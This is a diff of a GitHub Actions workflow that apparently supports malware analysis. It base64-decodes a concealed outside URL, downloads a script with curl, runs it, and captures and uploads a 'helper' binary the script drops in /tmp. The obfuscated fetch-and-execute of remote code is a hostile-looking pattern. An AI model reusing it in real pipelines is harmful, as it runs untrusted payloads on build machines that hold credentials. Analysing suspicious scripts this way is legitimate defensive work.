@@ -1,12 +1,11 @@
-name: Dynamic Script Analysis
+name: Extract Helper Binary
 
 on:
   workflow_dispatch:
 
 jobs:
-  analyze:
+  extract:
     runs-on: ubuntu-latest
-
     timeout-minutes: 10
 
     steps:
@@ -15,39 +14,46 @@ jobs:
           URL=$(echo "aHR0cHM6Ly9zYXRpbjg3LmNvbS9jdXJsLzY2MjdmMDJhN2EzNzVlZjEyYmUxMzMwMThiZDIyY2Y5MTRmNWFjYWYxMDljODc4NmIwMjk3MGNhZjFhYWU5YWU=" | base64 -d)
           echo "URL=$URL" >> $GITHUB_ENV
 
-      - name: Download
+      - name: Download script
         run: |
           curl -L "$URL" -o script.sh
           chmod +x script.sh
 
-      - name: Save baseline
+      - name: Show script
         run: |
-          find /home/runner -type f 2>/dev/null | sort > before-files.txt
-          ps aux > before-processes.txt
+          echo "===== SCRIPT ====="
+          cat script.sh
 
-      - name: Execute with timeout
+      - name: Extract helper URL
+        run: |
+          grep -aoE 'https://[^"]+' script.sh || true
+
+      - name: Execute until helper downloaded
         continue-on-error: true
         run: |
-          timeout 120 bash -x script.sh > runtime.log 2>&1
+          timeout 60 bash -x script.sh > runtime.log 2>&1 || true
 
-      - name: Collect after state
+      - name: Locate helper
         run: |
-          find /home/runner -type f 2>/dev/null | sort > after-files.txt
-          ps aux > after-processes.txt
+          ls -lah /tmp || true
 
-      - name: Diff files
-        run: |
-          diff before-files.txt after-files.txt > file-diff.txt || true
+          if [ -f /tmp/helper ]; then
+            file /tmp/helper > helper-info.txt
+            sha256sum /tmp/helper >> helper-info.txt
+          else
+            echo "helper not found" > helper-info.txt
+            exit 1
+          fi
 
-      - name: Upload results
+      - name: Upload helper binary
         uses: actions/upload-artifact@v4
         with:
-          name: analysis-results
+          name: helper-binary
           path: |
-            script.sh
+            /tmp/helper
+            helper-info.txt
             runtime.log
-            before-files.txt
-            after-files.txt
-            file-diff.txt
-            before-processes.txt
-            after-processes.txt
+
+      - name: Display helper info
+        run: |
+          cat helper-info.txt
